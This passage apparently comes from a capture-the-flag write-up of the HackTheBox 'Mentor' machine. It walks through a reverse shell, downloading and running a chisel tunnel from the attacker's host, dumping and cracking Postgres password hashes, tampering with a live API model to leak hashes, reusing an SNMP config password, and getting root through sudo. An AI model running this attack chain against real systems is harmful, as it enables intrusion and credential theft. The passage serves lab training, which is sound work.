Connection received on 10.10.11.193 40268
/app #

```

I’ll do a shell upgrade here:

```

/app # ^Z              
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
/app # ls
Dockerfile        app               python            requirements.txt
/app # 

```

`script` isn’t on the box, but I don’t need the `script` or `python -c` part because I already got a PTY via the reverse shell I used (look at the full reverse shell I used above, and check out [this video]([What Happens In a “Shell Upgrade”? - YouTube](https://www.youtube.com/watch?v=DqE6DxqJg8Q)) for details).

`user.txt` is in `/home/svc`:

```

/home/svc # cat user.txt
d8ac2aee************************

```

## Shell as svc

### Enumeration

#### Docker

As suspected, this is a container. The IP is 172.22.0.3:

```

/ # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:16:00:03  
          inet addr:172.22.0.3  Bcast:172.22.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2456 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2431 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:179536 (175.3 KiB)  TX bytes:173451 (169.3 KiB)

```

In `/app`, there’s a `Dockerfile` that defines the container:

```

FROM python:3.6.9-alpine

RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev

WORKDIR /app
ENV HOME /home/svc
ENV PATH /home/svc/.local/bin:${PATH}
RUN python -m pip install --upgrade pip --user svc
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
RUN pip install pydantic[email] pyjwt
EXPOSE 8000
COPY . .
CMD ["python3", "-m", "uvicorn", "app.main:app", "--reload", "--workers", "100", "--host", "0.0.0.0", "--port" ,"8000"]

```

I’ll notice that `uvicorn` is running with `--reload`, which means I can make changes to the API and they will automatically apply.

#### API

The application is based from `/app`:

```

/app # ls
Dockerfile        app               python            requirements.txt
/app # ls app/
__init__.py       api               db.py             requirements.txt
__pycache__       config.py         main.py

```

`config.py` is empty. `main.py` defines a FastAPI application, and loads four routers (same as those identified above).

`db.py` has the database connection:

```

import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)

# Databases query builder
database = Database(DATABASE_URL)

```

The database is running as the postgres user with password “postgres” on 172.22.0.1.

Even though the user object that came back via the API only showed `id`, `email`, and `username`, there’s also a `password` column in the DB. That’s because the of the model that’s defined in `api/models.py`:

```

class userDB(BaseModel):
    id: int
    email: str
    username: str

```

It’s invoked in each of the routes in `api/users.py`. For example:

```

# List users
@router.get('/',response_model=List[userDB], status_code=201, dependencies=[Depends(is_logged), Depends(is_admin)])
async def get_users(request: Request):

    return await crud.get_users()

```

### Database

#### Chisel Tunnel

I’ll grab the latest release from the [Chisel release page](https://github.com/jpillora/chisel/releases/tag/v1.8.1) and (serving it with Python) upload it to the container:

```

/tmp # wget 10.10.14.6/chisel_1.8.1_linux_amd64
Connecting to 10.10.14.6 (10.10.14.6:80)
chisel_1.8.1_linux_a 100% |********************************| 8188k  0:00:00 ETA

```

I’ll now start the server, changing the listening port because Burp is already listening on the default of 8080, and allowing for clients to open up reverse tunnels:

```

oxdf@hacky$ /opt/chisel/chisel_1.8.1_linux_amd64 server -p 8000 --reverse
2023/03/01 15:27:13 server: Reverse tunnelling enabled
2023/03/01 15:27:13 server: Fingerprint ybrz1cfmVu7k7CBD0xbNbHyFj1iM1q+Hyes16akTrl4=
2023/03/01 15:27:13 server: Listening on http://0.0.0.0:8000

```

I’ll connect from the container:

```

/tmp # ./chisel_1.8.1_linux_amd64 client 10.10.14.6:8000 R:5432:172.22.0.1:5432

```

And there’s a connection at the server:

```

2023/03/01 15:30:59 server: session#1: tun: proxy#R:5432=>172.22.0.1:5432: Listening

```

If there’s no connection, check that the server isn’t already listening on 5432. My Ubuntu image was, and I had to `sudo service postgresql stop` to free that port (or I could have used another port).

#### Connect to Database

I’ll use `psql` as the Postgres client to access the database, with the following options:
- `-h 127.0.0.1` - use my host (which has the tunnel to the container) as the host
- `-p 5432` - the port for the listening tunnel
- `-U postgres` - the username to connect as

I’ll enter “postgres” when prompted for the password, and it connects:

```

oxdf@hacky$ psql -h 127.0.0.1 -p 5432 -U postgres
Password for user postgres: 
psql (14.6 (Ubuntu 14.6-0ubuntu0.22.04.1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=#

```

#### Enumerate Database

The DB has four databases:

```

postgres=# \list
                                    List of databases
      Name       |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
-----------------+----------+----------+------------+------------+-----------------------
 mentorquotes_db | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres        | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
 template1       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
(4 rows)

```

`mentorquotes_db` is the interesting one. I’ll connect to that and list the tables:

```

postgres=# \connect mentorquotes_db 
psql (14.6 (Ubuntu 14.6-0ubuntu0.22.04.1), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
mentorquotes_db=# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

```

I have no idea what the `cmd_exec` table is. It has the output of `id` as the postgres user:

```

mentorquotes_db=# select * from cmd_exec;
                               cmd_output                               
------------------------------------------------------------------------
 uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
(1 row)

```

`users` shows two users (mine has been cleaned up it seems):

```

mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)

```

#### Alternative Method to Dump Hashes

Above I talked about how the model was preventing the hashes from being shown back to the user. I also noted that `uvicorn` was running with `--reload`.

I’ll use `vi` to edit `/app/app/api/models.py`, adding `password` to the model:

```

class userDB(BaseModel):
    id: int
    email: str
    username: str
    password: str 

```

I’ll have to disconnect my shell, as the website doesn’t seem to load when I have it connected. But then I can hit the API, and it gives the hashes:

![image-20230301154814543](https://0xdfimages.gitlab.io/img/image-20230301154814543.png)

### Shell over SSH

#### Crack Hash

The hash for svc is a known MD5 that loads in [CrackStation](https://crackstation.net/):

![image-20230301154956271](https://0xdfimages.gitlab.io/img/image-20230301154956271.png)

#### SSH

With that password, I can SSH to the host as svc:

```

oxdf@hacky$ sshpass -p '123meunomeeivani' ssh svc@10.10.11.193
Warning: Permanently added '10.10.11.193' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)
...[snip]...
svc@mentor:~$

```

## Shell as root

### Enumeration

#### Home Dirs

svc’s home directory is pretty empty:

```

svc@mentor:~$ ls -la
total 28
drwxr-x--- 4 svc  svc  4096 Nov 11 17:41 .
drwxr-xr-x 4 root root 4096 Jun 10  2022 ..
lrwxrwxrwx 1 root root    9 Nov 10 14:28 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc  3771 Jun  7  2022 .bashrc
drwx------ 3 svc  svc  4096 Jun 12  2022 .cache
drwxrwxr-x 5 svc  svc  4096 Jun 12  2022 .local
-rw-r--r-- 1 svc  svc   807 Jun  7  2022 .profile
-rw-r----- 1 root svc    33 Mar  1 19:27 user.txt

```

There is a james user on the box:

```

svc@mentor:/home$ ls
james  svc

```

I can’t access their home directory, and the previous james password from the website doesn’t work here.

#### Configs

Poking around at various configs on the box, I’ll take a look at SNMPd, which is in `/etc/snmp/snmpd.conf`. There’s a bunch of commented lines, which I’ll remove with `grep -v "^#"`, and a bunch of empty lines, which I’ll remove with `grep .`:

```

svc@mentor:/etc/snmp$ cat snmpd.conf | grep -v "^#" | grep .
sysLocation    Sitting on the Dock of the Bay
sysContact     Me <admin@mentorquotes.htb>
sysServices    72
master  agentx
agentAddress udp:161,udp6:[::1]:161
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
rouser authPrivUser authpriv -V systemonly
includeDir /etc/snmp/snmpd.conf.d
createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv
com2sec AllUser default internal
group AllGroup v2c AllUser
view SystemView included .1.3.6.1.2.1.25.1.1
view AllView included .1
access AllGroup "" any noauth exact AllView none none

```

There’s a password in there for a bootstrap SNMPv3 user, “SuperSecurePassword123\_\_”.

### su / sudo

#### Shell as james

This password doesn’t work for root:

```

svc@mentor:/$ su -
Password: 
su: Authentication failure

```

But it does work for james:

```

svc@mentor:/$ su james -
Password: 
james@mentor:/$ 

```

#### Shell as root

james can run `/bin/sh` as root:

```

james@mentor:/$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh

```

It does need a password, but I have it. Running gives a root shell:

```

james@mentor:/$ sudo /bin/sh
# bash
root@mentor:/#

```

And I can grab the flag:

```

root@mentor:/# cat root/root.txt
e69f189c************************

```